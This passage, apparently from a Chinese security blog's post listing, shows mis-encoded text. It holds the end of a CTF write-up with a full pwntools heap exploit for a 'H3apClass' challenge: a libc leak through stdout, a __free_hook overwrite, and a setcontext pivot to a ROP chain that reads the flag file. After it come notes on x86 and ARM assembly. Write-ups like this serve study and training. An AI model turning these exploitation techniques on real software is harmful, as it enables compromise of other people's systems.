class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./H3apClass&quot;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#elf = ELF(binary)</span></span><br><span class="line">context.timeout = <span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;4:Drop homework\n&quot;</span></span><br><span class="line">menu_n = <span class="string">&quot;4:Drop homework&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dockerDbg</span>():</span></span><br><span class="line">	myGdb = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line"><span class="comment">#b *$rebase(0xdbd)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(&#123;0&#125;) \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which homework?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:\n&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_n</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">    sla(menu_n, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which homework?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which homework?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_n</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu_n, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which homework?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># def show(idx):</span></span><br><span class="line"><span class="comment">#     sla(menu, &quot;3&quot;)</span></span><br><span class="line"><span class="comment">#     sla(&quot;I:&gt;&gt;\n&quot;, str(idx))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which homework?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content:\n&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_n</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">    sla(menu_n, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which homework?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	guess_libc=<span class="number">0x0000</span></span><br><span class="line">	guess_IO = guess_libc + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	guess_main = guess_libc + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	add(<span class="number">6</span>,<span class="number">0xf8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>+p16(<span class="number">0x501</span>))</span><br><span class="line">	delete(<span class="number">5</span>)</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x78</span>,p16((guess_IO)&amp;<span class="number">0xffff</span>))</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	<span class="comment">#dockerDbg()</span></span><br><span class="line">	fd = <span class="number">0x00000000fbad2887</span></span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0xf8</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p16((guess_main+<span class="number">96</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">	heap_base = uu64(rc(<span class="number">6</span>)) - <span class="number">0x0019a0</span></span><br><span class="line">	libc_base = u64Leakbase(<span class="number">0x1ebbf0</span>)</span><br><span class="line"></span><br><span class="line">	lg(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">	lg(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line">	free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	setcontext61 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">	lg(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">	gadget = libc_base + <span class="number">0x154930</span></span><br><span class="line">	<span class="comment">#dockerDbg()</span></span><br><span class="line">	<span class="comment">#dockerDbg()</span></span><br><span class="line">	delete_n(<span class="number">1</span>)</span><br><span class="line">	delete_n(<span class="number">2</span>)</span><br><span class="line">	delete_n(<span class="number">3</span>)</span><br><span class="line">	edit_n(<span class="number">4</span>,p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16(free_hook&gt;&gt;<span class="number">32</span>))</span><br><span class="line">	<span class="comment">#dockerDbg()</span></span><br><span class="line">	add_n(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">	add_n(<span class="number">2</span>,<span class="number">0xe8</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">	chunk1_addr = heap_base + <span class="number">0x0014b0</span></span><br><span class="line">	lg(<span class="string">&quot;chunk1_addr&quot;</span>,chunk1_addr)</span><br><span class="line">	add_n(<span class="number">3</span>,<span class="number">0x78</span>,p64(gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">	pop_rsi_ret = libc_base + <span class="number">0x0000000000027529</span> </span><br><span class="line">	pop_rdi_ret = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">	pop_rax_ret = libc_base + <span class="number">0x000000000004a550</span></span><br><span class="line">	syscall_ret = libc_base + <span class="number">0x0000000000066229</span></span><br><span class="line">	ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">	Open = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	Read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	Puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	chunk_addr = chunk1_addr</span><br><span class="line">	fake_rsp = chunk_addr + <span class="number">0xb0</span> + <span class="number">0x10</span></span><br><span class="line">	flag = chunk_addr + <span class="number">0xb0</span> </span><br><span class="line">	orw = <span class="string">&quot;a&quot;</span>*<span class="number">0x08</span> + p64(chunk_addr) </span><br><span class="line">	orw += <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> </span><br><span class="line">	orw += p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">	orw += <span class="string">&quot;a&quot;</span>*<span class="number">0x70</span></span><br><span class="line">	orw += p64(fake_rsp) + p64(ret)</span><br><span class="line">	orw += <span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">	orw += p64(<span class="number">0</span>)</span><br><span class="line">	orw += p64(pop_rdi_ret) + p64(flag)</span><br><span class="line">	orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">	orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">	orw += p64(syscall_ret)</span><br><span class="line">	orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">	orw += p64(pop_rsi_ret) + p64(fake_rsp+<span class="number">0x200</span>)</span><br><span class="line">	orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">	orw += p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">	orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">	orw += p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">	edit_n(<span class="number">1</span>,orw[<span class="number">0</span>:<span class="number">0x70</span>])</span><br><span class="line">	edit_n(<span class="number">2</span>,orw[<span class="number">0x80</span>:])</span><br><span class="line">	<span class="comment">#dockerDbg()</span></span><br><span class="line">	delete_n(<span class="number">1</span>)</span><br><span class="line">	it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    log.info(<span class="string">&quot;Times:%d&quot;</span>%i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    	<span class="comment">#p = remote(&quot;172.20.2.7&quot;,&quot;26351&quot;)</span></span><br><span class="line">        p = process(<span class="string">&quot;./H3apClass&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>

<p>æœ€åçš„httpdæ²¡çœ‹ï¼Œåé¢å†è¯´æŠŠã€‚</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/02/%E6%B1%87%E7%BC%96/">æ±‡ç¼–åŸºç¡€</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-23</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>å¤ä¹ ä¸€ä¸‹æ±‡ç¼–</p>

        <h1 id="ä¸€ã€X86"   >
          <a href="#ä¸€ã€X86" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€X86" class="headerlink" title="ä¸€ã€X86"></a>ä¸€ã€X86</h1>
      
        <h2 id="1-æ±‡ç¼–æŒ‡ä»¤"   >
          <a href="#1-æ±‡ç¼–æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="1.æ±‡ç¼–æŒ‡ä»¤"></a>1.æ±‡ç¼–æŒ‡ä»¤</h2>
      
        <h3 id="1-è·³è½¬"   >
          <a href="#1-è·³è½¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è·³è½¬" class="headerlink" title="(1)è·³è½¬"></a>(1)è·³è½¬</h3>
      <p>ä¾æ®ZF(Zero)ã€SF(Symbol))ã€OF(Overflow)ã€PF(Parity)ã€CF(Carry)äº”ç§çŠ¶æ€æ ‡å¿—ä½æœ‰å¯¹åº”çš„è·³è½¬JZ(JNZ)/JS(JNS)ç­‰äº”ç§è·³è½¬</p>
<p>çŠ¶æ€æ ‡å¿—ä½é™¤äº†ä»¥ä¸Šäº”ç§è¿˜æœ‰AF(Assistant)è¾…åŠ©è¿›ä½</p>
<p>æ­¤å¤–è¿˜æœ‰Jmpæ— æ¡ä»¶è·³è½¬</p>

        <h3 id="2-æ ‡å¿—ä½"   >
          <a href="#2-æ ‡å¿—ä½" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ‡å¿—ä½" class="headerlink" title="(2)æ ‡å¿—ä½"></a>(2)æ ‡å¿—ä½</h3>
      <p>ä»¥ä¸Šçš„å…­ç§çŠ¶æ€æ ‡å¿—ä½å¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹ä¸‰ç§æ ‡å¿—ä½</p>
<p>TF(trap):è·Ÿè¸ªæ ‡ç­”å¿—ä½ï¼šå•æ­¥æ ‡å¿—</p>
<p>IF(interregnum):ä¸­æ–­æ ‡å¿—ä½</p>
<p>DF(direction):æ–¹å‘æ ‡å¿—ä½</p>

        <h2 id="2-å¯„å­˜å™¨"   >
          <a href="#2-å¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯„å­˜å™¨" class="headerlink" title="2.å¯„å­˜å™¨"></a>2.å¯„å­˜å™¨</h2>
      
        <h3 id="1-ä¼ å‚"   >
          <a href="#1-ä¼ å‚" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¼ å‚" class="headerlink" title="(1)ä¼ å‚"></a>(1)ä¼ å‚</h3>
      <p>64ä½ï¼šrdi  rsi  rdx  rcx r8 r9 æ ˆ</p>
<p>32ä½ï¼šæ ˆä¼ å‚</p>

        <h3 id="2-æ ˆæŒ‡é’ˆ"   >
          <a href="#2-æ ˆæŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ˆæŒ‡é’ˆ" class="headerlink" title="(2)æ ˆæŒ‡é’ˆ"></a>(2)æ ˆæŒ‡é’ˆ</h3>
      <p>RSPã€RBP</p>

        <h1 id="äºŒã€ARM"   >
          <a href="#äºŒã€ARM" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ARM" class="headerlink" title="äºŒã€ARM"></a>äºŒã€ARM</h1>
      
        <h2 id="1-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#1-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="1.å¯„å­˜å™¨å…³ç³»"></a>1.å¯„å­˜å™¨å…³ç³»</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png" alt="32"></p>
<ul>
<li><p>R0<del>R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0</del>4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0<del>R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0</del>X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)</p>
</li>
<li><p>SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚</p>
</li>
<li><p>PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p>
</li>
<li><p>R11ï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆï¼Œå…¶å®å°±å·®ä¸å¤šæ˜¯FP</p>
</li>
</ul>

        <h2 id="2-æ±‡ç¼–æŒ‡ä»¤"   >
          <a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="2.æ±‡ç¼–æŒ‡ä»¤"></a>2.æ±‡ç¼–æŒ‡ä»¤</h2>
      
        <h3 id="1-å¯„å­˜å™¨ä¼ é€MOV"   >
          <a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="headerlink" title="(1)å¯„å­˜å™¨ä¼ é€MOV"></a>(1)å¯„å­˜å™¨ä¼ é€MOV</h3>
      <p>å¯„å­˜å™¨ä¹‹é—´è¿˜æ˜¯MOVæŒ‡ä»¤ï¼Œæ¯”å¦‚MOV R2,R0;ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å†…å­˜ä¸Šçš„ï¼Œåˆ™éœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œæˆ–è€…æŠŠå¯„å­˜å™¨ä¸­çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­</p>

        <h3 id="2-å¯„å­˜å™¨-å†…å­˜ä¼ é€"   >
          <a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="headerlink" title="(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€"></a>(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€</h3>
      <p>STR(store reg)/LDR(load reg)ä»¥åŠSTM(store multiple)/LDM(load multiple)</p>

        <h4 id="â‘ STR-LDRæ¨¡å¼"   >
          <a href="#â‘ STR-LDRæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ STR-LDRæ¨¡å¼" class="headerlink" title="â‘ STR/LDRæ¨¡å¼"></a>â‘ STR/LDRæ¨¡å¼</h4>
      
        <h5 id="STR-Ra-Rb-ï¼š"   >
          <a href="#STR-Ra-Rb-ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#STR-Ra-Rb-ï¼š" class="headerlink" title="STR Ra [Rb]ï¼š"></a>STR Ra [Rb]ï¼š</h5>
      <p>Raä¸­çš„æ•°æ®å­˜å‚¨åˆ°RbæŒ‡å‘çš„å†…å­˜ä¸­</p>

        <h5 id="LDR-Ra-Rb"   >
          <a href="#LDR-Ra-Rb" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDR-Ra-Rb" class="headerlink" title="LDR Ra [Rb]"></a>LDR Ra [Rb]</h5>
      <p>RbæŒ‡å‘çš„å†…å­˜ä¸­çš„å€¼åŠ è½½åˆ°Raä¸­</p>
<p>æ­¤å¤–è¿˜æœ‰å¦‚ä¸‹æƒ…å½¢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR  R0,[R1, #12]  // R0 --&gt; [R1+12]</span><br><span class="line">LDR  R4,[R5, R6]  // R4 &lt;-- [R5+R6]</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡STM-LDMæ¨¡å¼"   >
          <a href="#â‘¡STM-LDMæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡STM-LDMæ¨¡å¼" class="headerlink" title="â‘¡STM/LDMæ¨¡å¼"></a>â‘¡STM/LDMæ¨¡å¼</h4>
      
        <h5 id="STM-R0-R4-R5"   >
          <a href="#STM-R0-R4-R5" class="heading-link"><i class="fas fa-link"></i></a><a href="#STM-R0-R4-R5" class="headerlink" title="STM R0, {R4,R5}"></a>STM R0, {R4,R5}</h5>
      <p>R4çš„å€¼ä¼ é€ç»™R0+xå¯¹åº”çš„å†…å­˜å•å…ƒï¼Œç„¶åR5çš„å€¼ä¼ ç»™R0+x+xå¯¹åº”çš„å†…å­˜å•å…ƒ</p>
<p>è¿™ä¸ªxå³ç”±åç¼€å†³å®šï¼Œåˆ†åˆ«æœ‰ä»¥ä¸‹å‡ ç§</p>
<ul>
<li><p>DB(Decrease Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>DA(Decrease After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>IB(Increase Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
<li><p>IA(Increase After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
</ul>
<p>è€ŒXåˆ™åœ¨ä¸åŒçš„CPUä½æ•°ä¸‹ä¸åŒï¼Œ32ä¸º4ï¼Œ64åˆ™ä¸º8ã€‚</p>
<p>æ­¤å¤–å †æ ˆçš„å¢é•¿æ–¹å‘å¯ä»¥ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒæƒ…å½¢ä¸‹ä½œä¸ºåç¼€ï¼Œæ•ˆæœä¸€æ ·çš„</p>
<ul>
<li>FD(Full Descent)ï¼šæ»¡é€’å‡å †æ ˆ</li>
<li>FA(Full Ascent)ï¼šæ»¡é€’å¢å †æ ˆ</li>
<li>ED(Empty Descent)ï¼šç©ºé€’å‡å †æ ˆ</li>
<li>EA(Empty Ascent)ï¼šç©ºé€’å¢å †æ ˆ</li>
</ul>
<p>æ»¡åˆ™ä»£è¡¨æ ˆæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç©ºåˆ™ä»£è¡¨æ ˆæŒ‡é’ˆä¸æŒ‡å‘æ ˆé¡¶</p>

        <h3 id="3-è·³è½¬æŒ‡ä»¤"   >
          <a href="#3-è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·³è½¬æŒ‡ä»¤" class="headerlink" title="(3)è·³è½¬æŒ‡ä»¤"></a>(3)è·³è½¬æŒ‡ä»¤</h3>
      
        <h4 id="â‘ åˆ†æ”¯è·³è½¬-Branch"   >
          <a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="headerlink" title="â‘ åˆ†æ”¯è·³è½¬(Branch)"></a>â‘ åˆ†æ”¯è·³è½¬(Branch)</h4>
      
        <h5 id="B"   >
          <a href="#B" class="heading-link"><i class="fas fa-link"></i></a><a href="#B" class="headerlink" title="B"></a>B</h5>
      <p>æ— æ¡ä»¶è·³è½¬</p>

        <h5 id="BX-lt-Rm-gt"   >
          <a href="#BX-lt-Rm-gt" class="heading-link"><i class="fas fa-link"></i></a><a href="#BX-lt-Rm-gt" class="headerlink" title="BX &lt;Rm&gt;"></a>BX &lt;Rm&gt;</h5>
      <p>ç”±å¯„å­˜å™¨ç»™å‡ºåœ°å€</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º1ï¼Œåˆ‡æ¢åˆ° Thumb æŒ‡ä»¤æ‰§è¡Œï¼›</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º0ï¼Œåˆ‡æ¢åˆ° ARM æŒ‡ä»¤æ‰§è¡Œã€‚</p>

        <h5 id="BL"   >
          <a href="#BL" class="heading-link"><i class="fas fa-link"></i></a><a href="#BL" class="headerlink" title="BL"></a>BL</h5>
      <p>ç±»ä¼¼äºCallï¼Œä¼šå­˜å…¥è¿”å›åœ°å€åˆ°LRå¯„å­˜å™¨</p>

        <h5 id="BLX-BLR"   >
          <a href="#BLX-BLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#BLX-BLR" class="headerlink" title="BLX/BLR"></a>BLX/BLR</h5>
      <p>å³ç±»ä¼¼å¯¹åº”ç»„åˆ</p>

        <h4 id="â‘¡æ¡ä»¶è·³è½¬"   >
